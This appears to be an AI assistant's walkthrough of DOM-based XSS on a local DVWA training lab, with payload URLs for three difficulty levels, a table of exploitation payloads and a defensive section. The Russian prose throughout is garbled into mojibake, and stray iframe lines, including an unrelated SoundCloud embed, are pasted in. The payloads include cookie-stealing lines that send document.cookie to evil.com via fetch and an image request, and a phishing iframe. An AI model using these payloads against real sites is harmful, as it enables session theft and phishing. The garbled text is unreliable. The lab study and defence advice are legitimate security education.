**DOM-based XSS**. –≠—Ç–æ –æ–¥–Ω–∞ –∏–∑ —Å–∞–º—ã—Ö **—Å–∫—Ä—ã—Ç–Ω—ã—Ö –∏ –æ–ø–∞—Å–Ω—ã—Ö** —Ñ–æ—Ä–º XSS, –∏ —Å–µ–π—á–∞—Å –æ–±—ä—è—Å–Ω—é –≤—Å—ë –ø–æ –ø–æ–ª–æ—á–∫–∞–º ‚Äî –∫–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç, —á—Ç–æ —Ç—ã —Å–¥–µ–ª–∞–ª, –∏ –∫–∞–∫–∏–µ –≤–æ–∑–º–æ–∂–Ω—ã —É–ª—É—á—à–µ–Ω–∏—è –∞—Ç–∞–∫–∏.

---

# üìò –ê–Ω–∞–ª–∏–∑ DOM-based XSS –≤ DVWA

---

## üí° –ß—Ç–æ —Ç–∞–∫–æ–µ DOM-based XSS?

**DOM-based XSS** ‚Äî —ç—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç—å, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è **–Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∫–ª–∏–µ–Ω—Ç–∞ (–≤ –±—Ä–∞—É–∑–µ—Ä–µ)**, –∞ –Ω–µ —á–µ—Ä–µ–∑ –æ—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞.
–¢–æ –µ—Å—Ç—å:

* –°–µ—Ä–≤–µ—Ä –Ω–µ –≤–∏–¥–∏—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥.
* –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –≤ **JavaScript-–∫–æ–¥–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ**, –∫–æ—Ç–æ—Ä—ã–π **–æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –∏–∑ URL** (–Ω–∞–ø—Ä–∏–º–µ—Ä, `location.hash`, `location.search`, `document.URL`, `document.referrer`) –∏ **–≤—Å—Ç–∞–≤–ª—è–µ—Ç –∏—Ö –≤ DOM –±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏**.

---

## üß™ –£—Ä–æ–≤–µ–Ω—å Low

üîó **URL**:

```
http://localhost:8081/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

### üîç –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç?

1. JavaScript –ø–æ–ª—É—á–∞–µ—Ç `default` –∏–∑ `location.search`:

   ```js
   var defaultLang = document.URL.split('default=')[1];
   document.getElementById("languageSelect").innerHTML = defaultLang;
   ```
2. –≠—Ç–æ –≤—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è –≤ `innerHTML`, –±–µ–∑ –∫–∞–∫–æ–π-–ª–∏–±–æ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏.

‚û°Ô∏è –ü–æ—ç—Ç–æ–º—É `<script>alert(1)</script>` **–≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è**.
- <iframe src="javascript:alert(`xss`)">
---

## üß™ –£—Ä–æ–≤–µ–Ω—å Medium

üîó **URL**:

```
http://localhost:8081/vulnerabilities/xss_d/?default=</option></select><img src=123.png onerror="alert(document.cookie)">
```

### üîç –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç?

1. JavaScript —Å–Ω–æ–≤–∞ –≤—Å—Ç–∞–≤–ª—è–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `default` –≤ DOM (–≤–Ω—É—Ç—Ä—å `<select>`).
2. –ú—ã –∑–∞–∫—Ä—ã–≤–∞–µ–º `<option>` –∏ `<select>`, –∞ –∑–∞—Ç–µ–º **–≤—Å—Ç–∞–≤–ª—è–µ–º `img` —Å onerror\`** ‚Äî —Ö–∏—Ç—Ä—ã–π –æ–±—Ö–æ–¥ —Ñ–∏–ª—å—Ç—Ä–∞.

### üß† –ü–æ—á–µ–º—É —Ä–∞–±–æ—Ç–∞–µ—Ç?

* –ë—Ä–∞—É–∑–µ—Ä **–ø–∞—Ä—Å–∏—Ç HTML**, –∏ —Å–æ–∑–¥–∞—ë—Ç DOM-—ç–ª–µ–º–µ–Ω—Ç—ã.
* –¢–∞–∫ –∫–∞–∫ —ç—Ç–æ `innerHTML`, –≤—Å—ë –≤–Ω—É—Ç—Ä–∏ –ø–∞—Ä—Å–∏—Ç—Å—è –∫–∞–∫ HTML ‚Äî –≤–∫–ª—é—á–∞—è –∑–∞–∫—Ä—ã—Ç–∏–µ —Ç–µ–≥–æ–≤ –∏ —Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤.
* –ú—ã —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ "–≤—ã—à–ª–∏" –∏–∑ `<select>`, –∏ –¥–æ–±–∞–≤–∏–ª–∏ —Å–≤–æ–π `<img>` —Å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º JavaScript.

---

## üß™ –£—Ä–æ–≤–µ–Ω—å High

üîó **URL**:

```
http://localhost:8081/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie);</script>
```

### üîç –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç?

1. –í –∫–æ–¥–µ `default` —Ç–µ–ø–µ—Ä—å —á–∏—Ç–∞–µ—Ç—Å—è –Ω–µ –∏–∑ `location.search`, –∞ –∏–∑ **`location.hash`** (`#...`).
2. –¢–æ –µ—Å—Ç—å JavaScript, –Ω–∞–ø—Ä–∏–º–µ—Ä, –¥–µ–ª–∞–µ—Ç:

   ```js
   var lang = location.hash;
   document.getElementById("output").innerHTML = lang;
   ```
3. –ò —Å–Ω–æ–≤–∞ –≤—Å—Ç–∞–≤–ª—è–µ—Ç `innerHTML` ‚Äî –±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏.

‚û°Ô∏è –ü–æ—ç—Ç–æ–º—É `<script>alert(document.cookie);</script>` —Å—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –ø—Ä–∏ **–æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã**.
- <iframe src="javascript:alert(document.cookie)">
- <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
---

## üìå –ü–æ—á–µ–º—É DOM XSS –æ–ø–∞—Å–µ–Ω?

| –§–∞–∫—Ç–æ—Ä                               | –ü–æ—á–µ–º—É                                                                     |
| ------------------------------------ | -------------------------------------------------------------------------- |
| –ù–µ –≤–∏–¥–Ω–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ                  | –°–µ—Ä–≤–µ—Ä –Ω–µ –ø–æ–ª—É—á–∞–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç                                      |
| –ê–Ω—Ç–∏–≤–∏—Ä—É—Å –Ω–µ –ª–æ–≤–∏—Ç                   | –û–Ω –≤ `#fragment` ‚Äî –±—Ä–∞—É–∑–µ—Ä —Ç—É–¥–∞ –Ω–µ –∑–∞–≥–ª—è–¥—ã–≤–∞–µ—Ç, –µ—Å–ª–∏ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ –Ω–µ —Å–∫–∞–∑–∞—Ç—å |
| –ú–æ–∂–µ—Ç –ø—Ä–∏–º–µ–Ω—è—Ç—å—Å—è –≤ SPA              | –û—Å–æ–±–µ–Ω–Ω–æ –∞–∫—Ç—É–∞–ª—å–Ω–æ –≤ Single Page Applications                              |
| –ú–æ–∂–Ω–æ –ø–æ–¥–º–µ–Ω—è—Ç—å DOM –±–µ–∑ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ | –û—á–µ–Ω—å –≥–∏–±–∫–∏–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∞—Ç–∞–∫                                           |

---

## üéØ –ö–∞–∫ –º–æ–∂–Ω–æ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å?

| –¶–µ–ª—å               | –ü—Ä–∏–º–µ—Ä                                                                   | –ß—Ç–æ –ø—Ä–æ–∏–∑–æ–π–¥—ë—Ç                 |
| ------------------ | ------------------------------------------------------------------------ | ------------------------------ |
| –ü–æ—Ö–∏—â–µ–Ω–∏–µ –∫—É–∫–∏     | `#<script>fetch('https://evil.com?c='+document.cookie)</script>`         | –û—Ç–ø—Ä–∞–≤–∏—Ç —Å–µ—Å—Å–∏—é –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É |
| –ü–æ–¥–º–µ–Ω–∞ DOM        | `#<h1>You got hacked</h1>`                                               | –í—Å—Ç–∞–≤–∫–∞ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ HTML        |
| –§–∏—à–∏–Ω–≥ –ø—Ä—è–º–æ –≤ SPA | `#<iframe src="https://fake-login.com"></iframe>`                        | –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø–æ–¥ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ö–æ–¥–∞  |
| Silent Payload     | `#<img src=x onerror="new Image().src='//evil.com/c='+document.cookie">` | –¢–∏—Ö–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö          |

---

## üõ°Ô∏è –ö–∞–∫ –∑–∞—â–∏—â–∞—Ç—å—Å—è –æ—Ç DOM XSS?

* –ù–∏–∫–æ–≥–¥–∞ –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `innerHTML`, –µ—Å–ª–∏ –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏—Å—å `textContent` –∏–ª–∏ `innerText`.
* –ù–µ –≤—Å—Ç–∞–≤–ª—è—Ç—å –¥–∞–Ω–Ω—ã–µ –∏–∑ `location.*` –Ω–∞–ø—Ä—è–º—É—é –≤ DOM.
* –ü—Ä–∏–º–µ–Ω—è—Ç—å CSP (Content Security Policy), –æ—Å–æ–±–µ–Ω–Ω–æ –±–ª–æ–∫–∏—Ä–æ–≤–∫—É `unsafe-inline`.
* –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å **DOMPurify** –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –¥–∞–Ω–Ω—ã—Ö.
* –£–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∏ (React, Vue, Angular) –Ω–µ –¥–æ–ø—É—Å–∫–∞—é—Ç raw –≤—Å—Ç–∞–≤–∫–∏ HTML –±–µ–∑ —è–≤–Ω–æ–≥–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è (`dangerouslySetInnerHTML` –∏ –∞–Ω–∞–ª–æ–≥–∏).

---

## üß∞ –î–æ–ø–æ–ª–Ω–µ–Ω–∏–µ ‚Äî —à–ø–∞—Ä–≥–∞–ª–∫–∞ DOM-XSS –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ –∏ sinks

| –ò—Å—Ç–æ—á–Ω–∏–∫–∏ (`sources`) | –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –æ–ø–∞—Å–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è |
| --------------------- | ----------------------------- |
| `location.search`     | everything after `?`          |
| `location.hash`       | everything after `#`          |
| `document.referrer`   | –æ—Ç–∫—É–¥–∞ –ø–µ—Ä–µ—à–ª–∏                |
| `document.URL`        | –≤–µ—Å—å URL                      |

| –ú–µ—Å—Ç–∞ –≤—Å—Ç–∞–≤–∫–∏ (`sinks`)          | –£–≥—Ä–æ–∑–∞                 |
| -------------------------------- | ---------------------- |
| `innerHTML`                      | –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∏—Ä—É–µ—Ç HTML/JS |
| `document.write`                 | –∏—Å–ø–æ–ª–Ω—è–µ—Ç —Å—Ä–∞–∑—É        |
| `eval()`                         | –∏—Å–ø–æ–ª–Ω—è–µ—Ç –∫–∞–∫ –∫–æ–¥      |
| `setTimeout("...")`              | –µ—Å–ª–∏ —Å—Ç—Ä–æ–∫–∞            |
| `setAttribute("onclick", "...")` | –≤–Ω–µ–¥—Ä—è–µ—Ç –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏   |

---

–°–ª–µ–¥—É–µ—Ç –ø–æ–¥–≥–æ—Ç–æ–≤–∏—Ç—å:

‚úÖ –¢–∞–±–ª–∏—Ü—É –∞—Ç–∞–∫ –¥–ª—è DOM-XSS
‚úÖ –°—Ü–µ–Ω–∞—Ä–∏–∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ –≤ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö SPA
‚úÖ –®–∞–±–ª–æ–Ω—ã —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å DOM

